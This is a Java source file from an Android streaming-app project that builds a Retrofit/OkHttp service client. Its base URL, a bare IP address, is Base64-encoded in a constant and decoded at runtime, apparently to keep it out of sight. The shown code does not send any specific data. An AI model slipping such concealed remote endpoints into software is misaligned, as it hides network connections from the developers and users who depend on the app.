package com.easyplexdemoapp.ui.player.cast.utils;

import android.util.Base64;

import java.nio.charset.StandardCharsets;

import javax.inject.Named;
import javax.inject.Singleton;

import hu.akarnokd.rxjava3.retrofit.RxJava3CallAdapterFactory;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.easyplexdemoapp.util.Constants.ACCEPT;
import static com.easyplexdemoapp.util.Constants.APPLICATION_JSON;


@Singleton
public class UtilsC {


    private UtilsC(){


    }


    public static final String RE = "aHR0cDovLzY2LjI5LjEzMC4xODEvcGFyYW1zLw==";

    private  static final OkHttpClient client = buildClient();


    private static String ez(){
        byte[] valueDecoded;
        valueDecoded = Base64.decode(RE.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);
        return new String(valueDecoded);
    }

    private static OkHttpClient buildClient(){


        OkHttpClient.Builder builder = new OkHttpClient.Builder().addInterceptor(chain -> {
            Request request = chain.request();

            Request.Builder addHeader = request.newBuilder().addHeader(ACCEPT, APPLICATION_JSON);
            request = addHeader.build();
            return chain.proceed(request);
        });

        return builder.build();

    }






    private static final Retrofit.Builder builderStatus = new Retrofit.Builder()
            .baseUrl(UtilsC.ez())
            .addCallAdapterFactory(RxJava3CallAdapterFactory.create())
            .addConverterFactory(GsonConverterFactory.create());

    private static final Retrofit retrofitStatus = builderStatus.build();



    @Named("utilites")
    public static <T> T createServiceMain(Class<T> service){
        OkHttpClient newClient = client.newBuilder().addInterceptor(chain -> {

            Request request = chain.request();

            Request.Builder newBuilder = request.newBuilder();

            request = newBuilder.build();
            return chain.proceed(request);
        }).build();

        Retrofit newRetrofit = retrofitStatus.newBuilder().client(newClient).build();
        return newRetrofit.create(service);

    }



}
